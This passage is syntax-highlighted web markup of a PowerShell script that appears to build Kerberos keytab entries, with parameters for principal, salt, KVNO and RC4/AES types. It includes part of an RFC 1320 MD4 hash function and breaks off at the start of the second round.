</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>,</span><span class=na>HelpMessage</span><span class=p>=</span><span class=s2>&#34;Principal is case sensative. It must match the principal portion of the UPN&#34;</span><span class=p>,</span><span class=na>ValueFromPipelineByPropertyName</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$Principal</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)]</span><span class=nv>$Password</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)]</span><span class=nv>$SALT</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)]</span><span class=nv>$File</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>,</span><span class=na>ValueFromPipelineByPropertyName</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$KVNO</span><span class=p>=</span><span class=mf>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_INST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_HST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_UID&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$PType</span><span class=p>=</span><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$RC4</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$AES128</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$AES256</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$Append</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$Quiet</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)][</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$NoPrompt</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-MD4</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>PARAM</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=no>String</span><span class=p>]</span><span class=nv>$String</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=no>Byte[]</span><span class=p>]</span><span class=nv>$bArray</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=no>Switch</span><span class=p>]</span><span class=nv>$UpperCase</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c># Author: Larry.Song@outlook.com</span>
</span></span><span class=line><span class=cl>    <span class=c># https://github.com/LarrysGIT/MD4-powershell</span>
</span></span><span class=line><span class=cl>    <span class=c># Reference: https://tools.ietf.org/html/rfc1320</span>
</span></span><span class=line><span class=cl>    <span class=c># MD4(&#39;abc&#39;): a448017aaf21d8525fc10ae87aa6729d</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Array</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$String</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$Array</span> <span class=p>=</span> <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=vm>@</span><span class=p>(</span><span class=nv>$String</span><span class=p>.</span><span class=py>ToCharArray</span><span class=p>()</span> <span class=p>|</span> <span class=p>%{[</span><span class=no>int</span><span class=p>]</span><span class=nv>$_</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$bArray</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$Array</span> <span class=p>=</span> <span class=nv>$bArray</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c># padding 100000*** to length 448, last (64 bits / 8) 8 bytes fill with original length</span>
</span></span><span class=line><span class=cl>    <span class=c># at least one (512 bits / 8) 64 bytes array</span>
</span></span><span class=line><span class=cl>    <span class=nv>$M</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>Byte</span><span class=p>[]</span> <span class=p>(([</span><span class=no>math</span><span class=p>]::</span><span class=n>Floor</span><span class=p>(</span><span class=nv>$Array</span><span class=p>.</span><span class=n>Count</span><span class=p>/</span><span class=mf>64</span><span class=p>)</span> <span class=p>+</span> <span class=mf>1</span><span class=p>)</span> <span class=p>*</span> <span class=mf>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c># copy original byte array, start from index 0</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Array</span><span class=p>.</span><span class=py>CopyTo</span><span class=p>(</span><span class=nv>$M</span><span class=p>,</span> <span class=mf>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c># padding bits 1000 0000</span>
</span></span><span class=line><span class=cl>    <span class=nv>$M</span><span class=p>[</span><span class=nv>$Array</span><span class=p>.</span><span class=n>Count</span><span class=p>]</span> <span class=p>=</span> <span class=n>0x80</span>
</span></span><span class=line><span class=cl>    <span class=c># padding bits 0000 0000 to fill length (448 bits /8) 56 bytes</span>
</span></span><span class=line><span class=cl>    <span class=c># Default value is 0 when creating a new byte array, so, no action</span>
</span></span><span class=line><span class=cl>    <span class=c># padding message length to the last 64 bits</span>
</span></span><span class=line><span class=cl>    <span class=vm>@</span><span class=p>([</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>GetBytes</span><span class=p>(</span><span class=nv>$Array</span><span class=p>.</span><span class=py>Count</span> <span class=p>*</span> <span class=mf>8</span><span class=p>)).</span><span class=py>CopyTo</span><span class=p>(</span><span class=nv>$M</span><span class=p>,</span> <span class=nv>$M</span><span class=p>.</span><span class=py>Count</span> <span class=p>-</span> <span class=mf>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c># message digest buffer (A,B,C,D)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=s1>&#39;0x67452301&#39;</span><span class=p>,</span> <span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=s1>&#39;0xefcdab89&#39;</span><span class=p>,</span> <span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=s1>&#39;0x98badcfe&#39;</span><span class=p>,</span> <span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=s1>&#39;0x10325476&#39;</span><span class=p>,</span> <span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c># There is no unsigned number shift in C#, have to define one.</span>
</span></span><span class=line><span class=cl>    <span class=nb>Add-Type</span> <span class=n>-TypeDefinition</span> <span class=sh>@&#39;
</span></span></span><span class=line><span class=cl><span class=sh>public class Shift
</span></span></span><span class=line><span class=cl><span class=sh>{
</span></span></span><span class=line><span class=cl><span class=sh>  public static uint Left(uint a, int b)
</span></span></span><span class=line><span class=cl><span class=sh>    {
</span></span></span><span class=line><span class=cl><span class=sh>        return ((a &lt;&lt; b) | (((a &gt;&gt; 1) &amp; 0x7fffffff) &gt;&gt; (32 - b - 1)));
</span></span></span><span class=line><span class=cl><span class=sh>    }
</span></span></span><span class=line><span class=cl><span class=sh>}
</span></span></span><span class=line><span class=cl><span class=sh>&#39;@</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c># define 3 auxiliary functions</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span><span class=w> </span><span class=nb>FF([uint32]$X</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Y</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=nv>$X</span> <span class=o>-band</span> <span class=nv>$Y</span><span class=p>)</span> <span class=o>-bor</span> <span class=p>((</span><span class=o>-bnot</span> <span class=nv>$X</span><span class=p>)</span> <span class=o>-band</span> <span class=nv>$Z</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span><span class=w> </span><span class=nb>GG([uint32]$X</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Y</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>((</span><span class=nv>$X</span> <span class=o>-band</span> <span class=nv>$Y</span><span class=p>)</span> <span class=o>-bor</span> <span class=p>(</span><span class=nv>$X</span> <span class=o>-band</span> <span class=nv>$Z</span><span class=p>)</span> <span class=o>-bor</span> <span class=p>(</span><span class=nv>$Y</span> <span class=o>-band</span> <span class=nv>$Z</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span><span class=w> </span><span class=nb>HH([uint32]$X</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Y</span><span class=p>,</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]</span><span class=nv>$Z</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$X</span> <span class=o>-bxor</span> <span class=nv>$Y</span> <span class=o>-bxor</span> <span class=nv>$Z</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c># processing message in one-word blocks</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=p>=</span> <span class=mf>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>-lt</span> <span class=nv>$M</span><span class=p>.</span><span class=n>Count</span><span class=p>;</span> <span class=nv>$i</span> <span class=p>+=</span> <span class=mf>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c># Save a copy of A/B/C/D</span>
</span></span><span class=line><span class=cl>        <span class=nv>$AA</span> <span class=p>=</span> <span class=nv>$A</span>
</span></span><span class=line><span class=cl>        <span class=nv>$BB</span> <span class=p>=</span> <span class=nv>$B</span>
</span></span><span class=line><span class=cl>        <span class=nv>$CC</span> <span class=p>=</span> <span class=nv>$C</span>
</span></span><span class=line><span class=cl>        <span class=nv>$DD</span> <span class=p>=</span> <span class=nv>$D</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c># Round 1 start</span>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>0</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>3</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>4</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>7</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>8</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>11</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>12</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>15</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>19</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>16</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>19</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>20</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>23</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>24</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>27</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>28</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>31</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>19</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>32</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>35</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>36</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>39</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>40</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>43</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>44</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>47</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>19</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>48</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>51</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>52</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>55</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>56</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>59</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>FF</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>60</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>63</span><span class=p>)],</span> <span class=mf>0</span><span class=p>))</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>19</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c># Round 1 end</span>
</span></span><span class=line><span class=cl>        <span class=c># Round 2 start</span>
